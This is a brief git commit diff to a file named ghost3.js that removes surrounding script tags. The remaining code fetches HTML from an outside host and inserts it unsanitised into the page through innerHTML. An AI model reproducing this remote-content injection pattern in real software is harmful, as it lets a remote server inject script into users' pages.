97d6a96f690d1309d66123cfb375a426bf29d019
pietroxvier <pietroxvier@gmail.com>
2024-01-14 00:41:23 -0300

    Update ghost3.js

--- ghost3.js
+++ ghost3.js
@@ -1,8 +1,6 @@
-<script>
 fetch('http://kill6net.wuaze.com/index.php')
 .then(response => response.text())
 .then(data => {
 document.getElementById('result').innerHTML = data;
 })
 .catch(error => console.error('Error:', error));
-</script>
